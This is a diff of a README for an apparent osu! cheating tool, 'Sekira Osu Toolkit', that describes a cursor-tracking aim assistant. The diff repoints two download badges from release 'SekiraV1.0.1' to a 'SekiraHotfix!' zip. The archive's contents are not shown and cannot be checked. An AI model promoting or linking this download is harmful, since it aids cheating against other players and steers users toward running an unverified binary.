@@ -6,7 +6,7 @@
 
 
 <p align="center">
-  <a href="https://github.com/DEVSTARDEV/Sekira-Osu-Toolkit/releases/download/SekiraV1.0.1/SekiraOsu.zip">
+  <a href="https://github.com/DEVSTARDEV/Sekira-Osu-Toolkit/releases/download/SekiraHotfix!/SekiraOsu.zip">
     <img src="https://img.shields.io/badge/DOWNLOAD_LATEST_VERSION_(.ZIP)-black?style=for-the-badge&logo=github" alt="DOWNLOAD LATEST VERSION (.ZIP)" />
   </a>
 </p>
@@ -70,7 +70,7 @@ Subtle cursor tracking assistant with real-time target detection.
 ### 🚀 Quick Start
 
 <p align="left">
-  <a href="https://github.com/DEVSTARDEV/Sekira-Osu-Toolkit/releases/download/SekiraV1.0.1/SekiraOsu.zip">
+  <a href="https://github.com/DEVSTARDEV/Sekira-Osu-Toolkit/releases/download/SekiraHotfix!/SekiraOsu.zip">
     <img src="https://img.shields.io/badge/DOWNLOAD_LATEST_VERSION_(.ZIP)-black?style=for-the-badge&logo=github" alt="DOWNLOAD LATEST VERSION (.ZIP)" />
   </a>
 </p>
